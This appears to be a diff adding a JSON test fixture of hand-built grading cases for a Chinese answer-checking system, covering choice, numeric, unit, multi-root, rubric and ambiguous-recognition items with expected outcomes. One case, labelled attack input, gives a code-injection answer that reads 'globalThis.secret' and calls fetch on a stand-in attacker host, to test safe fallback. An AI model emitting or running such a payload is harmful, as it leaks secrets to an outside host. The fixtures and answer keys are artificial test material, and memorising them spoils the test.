@@ -1,0 +1,227 @@
+{
+  "version": "learning-quality-1.1",
+  "provenance": "项目自编固定算例，期望值人工独立计算；非模型生成答案、非公开真题。",
+  "claims": "仅验证有限判分及安全降级机制，不能证明全学科效果或长期学习效果。",
+  "cases": [
+    {
+      "id": "choice-correct",
+      "category": "客观题",
+      "validation": {
+        "type": "choice",
+        "answer": "B",
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-manual-choice"
+      },
+      "answer": "我选B",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "correct",
+      "prompt": "2+2 的结果是多少？",
+      "options": ["A.3", "B.4", "C.5"]
+    },
+    {
+      "id": "choice-wrong",
+      "category": "客观题",
+      "validation": {
+        "type": "choice",
+        "answer": "AC",
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-manual-multiple"
+      },
+      "answer": "A",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "wrong",
+      "prompt": "选择所有偶数。",
+      "options": ["A.2", "B.3", "C.4"]
+    },
+    {
+      "id": "equivalent-fraction",
+      "category": "计算题",
+      "validation": {
+        "type": "number",
+        "answer": "1/2",
+        "authority": "executable",
+        "evidenceId": "fixture-rational"
+      },
+      "answer": "0.5",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "correct",
+      "prompt": "将1/2写成等价小数。",
+      "options": []
+    },
+    {
+      "id": "unit-correct",
+      "category": "单位",
+      "validation": {
+        "type": "number",
+        "answer": "2",
+        "unit": "m",
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-unit"
+      },
+      "answer": "2m",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "correct",
+      "prompt": "一段长度为2米，用m表达。",
+      "options": []
+    },
+    {
+      "id": "unit-needs-conversion",
+      "category": "单位",
+      "validation": {
+        "type": "number",
+        "answer": "2",
+        "unit": "m",
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-unit"
+      },
+      "answer": "200cm",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "correct",
+      "prompt": "一段长度为2米，用等价单位表达。",
+      "options": []
+    },
+    {
+      "id": "subjective-rubric",
+      "category": "主观题",
+      "validation": {
+        "type": "rubric",
+        "dimensions": ["论点", "论据"],
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-rubric"
+      },
+      "answer": "一个可讨论的论点和论据。",
+      "expectedStatus": "pending",
+      "expectedOutcome": null,
+      "prompt": "用论点和论据说明一个观点。",
+      "options": []
+    },
+    {
+      "id": "multiple-roots",
+      "category": "多解",
+      "validation": {
+        "type": "number_set",
+        "answers": [-2, 2],
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-roots"
+      },
+      "answer": "±2",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "correct",
+      "prompt": "解x的平方=4，给出全部实根。",
+      "options": []
+    },
+    {
+      "id": "image-uncertain-exponent",
+      "category": "含图与识别歧义",
+      "validation": {
+        "type": "number",
+        "answer": "4",
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-image"
+      },
+      "uncertainties": [
+        {
+          "field": "上标",
+          "resolved": false
+        }
+      ],
+      "answer": "2",
+      "expectedStatus": "pending",
+      "expectedOutcome": null,
+      "prompt": "图片中上标不清楚，可能是x平方或x。",
+      "options": []
+    },
+    {
+      "id": "model-consensus-not-authority",
+      "category": "答案证据",
+      "validation": {
+        "type": "number",
+        "answer": "4",
+        "authority": "model_consensus",
+        "evidenceId": "two-models"
+      },
+      "answer": "4",
+      "expectedStatus": "pending",
+      "expectedOutcome": null,
+      "prompt": "两个模型都给出4，但没有独立答案依据。",
+      "options": []
+    },
+    {
+      "id": "malicious-expression",
+      "category": "攻击输入",
+      "validation": {
+        "type": "number",
+        "answer": "4",
+        "authority": "executable",
+        "evidenceId": "fixture-rational"
+      },
+      "answer": "globalThis.secret; fetch('https://attacker.invalid')",
+      "expectedStatus": "pending",
+      "expectedOutcome": null,
+      "prompt": "2+2的结果是多少？",
+      "options": []
+    },
+    {
+      "id": "partial-roots",
+      "category": "多解部分正确",
+      "prompt": "解 x 平方 = 4，写出全部实根",
+      "options": [],
+      "validation": {
+        "type": "number_set",
+        "answers": [-2, 2],
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-roots"
+      },
+      "answer": "2",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "partial"
+    },
+    {
+      "id": "unit-dimension-conflict",
+      "category": "单位维度",
+      "prompt": "将2米写成等价长度",
+      "options": [],
+      "validation": {
+        "type": "number",
+        "answer": "2",
+        "unit": "m",
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-unit"
+      },
+      "answer": "2kg",
+      "expectedStatus": "pending",
+      "expectedOutcome": null
+    },
+    {
+      "id": "invalid-reference-domain",
+      "category": "定义域与答案争议",
+      "prompt": "求正数 x，使其平方为4",
+      "options": [],
+      "validation": {
+        "type": "number_set",
+        "domain": "positive",
+        "answers": [-2, 2],
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-conflict"
+      },
+      "answer": "2",
+      "expectedStatus": "pending",
+      "expectedOutcome": null
+    },
+    {
+      "id": "ordered-equivalent-roots",
+      "category": "等价多解表达",
+      "prompt": "解 x 平方 = 4，写出全部实根",
+      "options": [],
+      "validation": {
+        "type": "number_set",
+        "answers": [-2, 2],
+        "authority": "human_reviewed",
+        "evidenceId": "fixture-roots"
+      },
+      "answer": "{2、-2}",
+      "expectedStatus": "reliable",
+      "expectedOutcome": "correct"
+    }
+  ]
+}
